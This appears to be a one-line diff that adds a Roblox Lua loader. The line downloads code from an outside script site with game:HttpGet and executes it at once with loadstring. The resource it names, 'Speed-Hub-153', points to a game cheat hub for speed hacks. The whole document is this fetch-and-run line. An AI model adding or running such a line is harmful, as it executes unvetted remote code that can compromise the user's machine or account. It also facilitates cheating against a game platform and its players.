@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://robloxscripts.co.uk/request-script/Speed-Hub-153'))()
